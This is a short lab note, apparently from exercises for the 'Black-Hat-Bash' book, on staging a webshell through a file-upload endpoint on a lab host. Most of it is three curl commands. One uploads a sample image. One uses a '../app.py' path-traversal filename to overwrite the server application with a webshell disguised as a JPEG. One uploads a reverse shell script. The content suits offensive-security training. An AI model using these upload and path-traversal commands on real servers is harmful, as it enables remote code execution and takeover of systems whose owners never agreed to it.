# Options to stage webshell

## Burpsuite

Use this GUI tool to tamper HTTP request.

## cURL

Upload sample image:
```
curl -X POST "http://172.16.10.10:8081/upload" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@/home/kali/Projects/Black-Hat-Bash/LAB-PLAYGROUND/exercises/webshell-to-reverse-shell/pwc.jpeg;filename=pwc.jpeg"
```

Stage webshell file into `../app.py` file (note that file should be uploaded with `jpeg` extension):
```
curl -X POST "http://172.16.10.10:8081/upload" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@/home/kali/Projects/Black-Hat-Bash/LAB-PLAYGROUND/exercises/webshell-to-reverse-shell/app_with_webshell.jpeg;filename=../app.py"
```

Stage reverse shell script (make sure to make is executable and change file extension to `.sh`):
```
curl -X POST "http://172.16.10.10:8081/upload" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@/home/kali/Projects/Black-Hat-Bash/LAB-PLAYGROUND/exercises/webshell-to-reverse-shell/run_rs.sh.jpeg"
```
